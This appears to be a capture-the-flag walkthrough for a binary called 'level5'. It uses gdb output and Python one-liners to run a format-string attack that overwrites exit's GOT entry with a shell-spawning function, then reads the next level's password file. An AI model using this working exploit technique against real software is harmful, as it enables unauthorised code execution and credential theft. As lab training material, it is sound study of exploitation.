@@ -1,0 +1,39 @@
+# Call to `fgets` which is protected against buffer overflow
+=> 0x80484e5 <n+35>:	call   0x80483a0 <fgets@plt>
+
+# We can see a call to `printf` with whatever we enter previously as the string argument
+=> 0x80484f3 <n+49>:	call   0x8048380 <printf@plt>
+
+# We can also see a function `o` which call `system("/bin/sh")`
+# But this function is not called
+
+# First we need to find the address of this function `o`
+gdb> x o
+0x80484a4 <o>:	0x83e58955
+
+# The `main` function call the `n` function which does not return, but call exit instead
+=> 0x80484ff <n+61>:	call   0x80483d0 <exit@plt>
+
+# We will then find the address of the exit function in the Global Offset Table
+gdb> disass n
+[...]
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+[...]
+gdb> disass 0x80483d0
+[...]
+   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
+[...]
+gdb> x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+
+# `o` is at 0x80484a4 and `exit` is at `0x8049838` in the GOT
+
+# We will first use the Format String Attack to find where is the address of `exit`
+$> python -c "print '\x38\x98\x04\x08' + '%x '*4" | ./level5
+8200 b7fd1ac0 b7ff37d0 8049838
+
+# Then we use the same exploit to modify the adress of `exit` by the address of `o`
+$> python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload5
+$> cat /tmp/payload5 - | ./level5
+> cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
